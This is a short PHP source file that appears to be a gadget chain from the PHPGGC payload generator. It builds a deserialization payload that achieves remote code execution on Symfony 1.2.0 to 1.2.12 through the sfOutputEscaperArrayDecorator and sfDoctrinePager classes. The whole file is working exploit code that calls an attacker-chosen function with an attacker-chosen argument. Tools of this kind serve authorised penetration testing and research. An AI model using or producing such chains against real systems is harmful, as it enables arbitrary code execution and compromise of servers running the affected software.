<?php

namespace GadgetChain\Symfony;

class RCE13 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.2.0 <= 1.2.12';
    public static $vector = 'Serializable';
    public static $author = 'darkpills';
    public static $information = 'Requires sfDoctrinePlugin to be enabled';

    public function generate(array $parameters)
    {
        $escaper = new \sfOutputEscaperArrayDecorator($parameters['function'], array($parameters['parameter']));
        $pager = new \sfDoctrinePager($escaper);
    
        return $pager;
    }
}
